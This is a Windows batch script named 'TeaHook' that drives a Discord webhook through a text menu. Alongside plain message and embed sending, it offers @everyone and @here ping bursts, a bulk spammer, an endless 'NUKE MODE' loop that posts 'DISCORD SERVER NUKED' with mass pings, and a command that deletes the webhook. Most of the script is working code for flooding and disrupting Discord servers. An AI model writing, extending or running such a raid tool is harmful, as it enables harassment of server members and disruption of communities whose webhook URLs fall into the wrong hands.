@echo off
setlocal EnableDelayedExpansion
title TeaHook

set "config_file=%~dp0teahook_session.ini"
set "webhook="
set "botname=TeaHook"
set "avatar="

if exist "%config_file%" (
    for /f "usebackq tokens=1,* delims==" %%a in ("%config_file%") do (
        if "%%a"=="webhook" set "webhook=%%b"
        if "%%a"=="botname" set "botname=%%b"
        if "%%a"=="avatar" set "avatar=%%b"
    )
)

if "!webhook!"=="" goto INITIAL_SETUP
goto MAINMENU

:INITIAL_SETUP
cls
color 0A
echo ====================================================
echo            TEAHOOK INITIAL SESSION SETUP
echo ====================================================
echo  Configuration is required before opening the menu.
echo ====================================================
echo.

:GET_WEBHOOK
set "input_url="
set /p input_url="Enter Webhook URL: "
if defined input_url set "webhook=!input_url:"=!"
if "!webhook!"=="" (
    echo Error: Webhook URL cannot be blank.
    goto GET_WEBHOOK
)

set "input_botname="
set /p input_botname="Enter Bot Name (Default: TeaHook): "
if defined input_botname set "botname=!input_botname!"

set "input_avatar="
set /p input_avatar="Enter Avatar Image URL (Optional): "
if defined input_avatar set "avatar=!input_avatar!"

call :SAVE_SESSION
echo.
echo Session saved successfully.
timeout /t 2 >nul
goto MAINMENU

:SAVE_SESSION
(
    echo webhook=!webhook!
    echo botname=!botname!
    echo avatar=!avatar!
) > "%config_file%"
exit /b

:MAINMENU
cls
color 0A
echo ====================================================
echo                     TEAHOOK
echo ====================================================
echo  Target Webhook : !webhook!
echo  Bot Name       : !botname!
echo ====================================================
echo  [1]  Send Fast Text Message
echo  [2]  Send Rich Embed
echo  [3]  Quick @everyone Ping Burst
echo  [4]  Quick @here Ping Burst
echo  [5]  Custom Speed Spammer
echo  [6]  NUKE MODE (Infinite Max Speed Loop)
echo  [7]  Send Custom Raw JSON Payload
echo  [8]  Customize Bot (Name / Avatar)
echo  [9]  Change Webhook URL
echo  [10] Check Webhook Info
echo  [11] Reset Session File
echo  [12] Delete Webhook
echo  [13] Exit
echo ====================================================
echo.
set "choice="
set /p choice="Select option [1-13]: "

if "!choice!"=="1" goto SENDMSG
if "!choice!"=="2" goto SENDEMBED
if "!choice!"=="3" goto PING_EVERYONE
if "!choice!"=="4" goto PING_HERE
if "!choice!"=="5" goto SPAMMER
if "!choice!"=="6" goto NUKE
if "!choice!"=="7" goto RAW_JSON
if "!choice!"=="8" goto SETBOT
if "!choice!"=="9" goto SETUP_URL
if "!choice!"=="10" goto CHECKWEBHOOK
if "!choice!"=="11" goto RESET_SESSION
if "!choice!"=="12" goto DELETEWEBHOOK
if "!choice!"=="13" exit /b
goto MAINMENU

:SENDMSG
echo.
set /p msg="Message text: "
call :FAST_SEND "!msg!"
echo Message sent.
pause
goto MAINMENU

:SENDEMBED
echo.
set /p title="Embed Title: "
set /p desc="Embed Description: "
set /p color="Embed Color (Decimal, default 3447003): "
if "!color!"=="" set "color=3447003"
set /p footer="Footer Text: "

curl -s -H "Content-Type: application/json" -X POST -d "{\"username\":\"!botname!\",\"avatar_url\":\"!avatar!\",\"embeds\":[{\"title\":\"!title!\",\"description\":\"!desc!\",\"color\":!color!,\"footer\":{\"text\":\"!footer!\"}}]}" "!webhook!" >nul
echo Embed sent.
pause
goto MAINMENU

:PING_EVERYONE
echo.
set /p count="How many @everyone pings to burst?: "
for /l %%i in (1,1,!count!) do (
    call :FAST_SEND "@everyone"
)
echo Ping burst finished.
pause
goto MAINMENU

:PING_HERE
echo.
set /p count="How many @here pings to burst?: "
for /l %%i in (1,1,!count!) do (
    call :FAST_SEND "@here"
)
echo Ping burst finished.
pause
goto MAINMENU

:SPAMMER
echo.
set /p spam_msg="Message to spam: "
set /p count="Amount of messages: "

echo Running fast loop...
for /l %%i in (1,1,!count!) do (
    call :FAST_SEND "!spam_msg!"
)
echo Done.
pause
goto MAINMENU

:NUKE
cls
echo ====================================================
echo  WARNING: NUKE MODE ACTIVATED
echo  Sending continuous @everyone messages at max speed.
echo  Press CTRL + C to stop the script.
echo ====================================================
echo.
pause

:NUKE_LOOP
curl -s -H "Content-Type: application/json" -X POST -d "{\"username\":\"!botname!\",\"avatar_url\":\"!avatar!\",\"content\":\"@everyone @everyone DISCORD SERVER NUKED @everyone @everyone\"}" "!webhook!" >nul
goto NUKE_LOOP

:RAW_JSON
echo.
set /p raw_payload="Enter Raw JSON Payload: "
curl -s -H "Content-Type: application/json" -X POST -d "!raw_payload!" "!webhook!" >nul
echo Payload dispatched.
pause
goto MAINMENU

:SETBOT
echo.
set /p botname="Enter Bot Display Name: "
set /p avatar="Enter Avatar Image URL: "
call :SAVE_SESSION
echo Profile updated and saved to session.
pause
goto MAINMENU

:SETUP_URL
echo.
set "input_url="
set /p input_url="Enter New Webhook URL: "
if defined input_url set "webhook=!input_url:"=!"
call :SAVE_SESSION
echo Webhook URL updated and saved to session.
pause
goto MAINMENU

:CHECKWEBHOOK
echo.
echo Fetching webhook details...
echo ---------------------------------------------------
curl -s "!webhook!"
echo.
echo ---------------------------------------------------
pause
goto MAINMENU

:RESET_SESSION
if exist "%config_file%" del "%config_file%"
set "webhook="
set "botname=TeaHook"
set "avatar="
echo Session file deleted.
pause
goto INITIAL_SETUP

:DELETEWEBHOOK
echo.
set /p confirm="Are you sure you want to delete this webhook from Discord? (Y/N): "
if /i "!confirm!"=="Y" (
    curl -s -X DELETE "!webhook!"
    if exist "%config_file%" del "%config_file%"
    set "webhook="
    echo Webhook deleted and session reset.
    pause
    goto INITIAL_SETUP
)
goto MAINMENU

:FAST_SEND
set "payload_text=%~1"
curl -s -H "Content-Type: application/json" -X POST -d "{\"username\":\"!botname!\",\"avatar_url\":\"!avatar!\",\"content\":\"!payload_text!\"}" "!webhook!" >nul
exit /b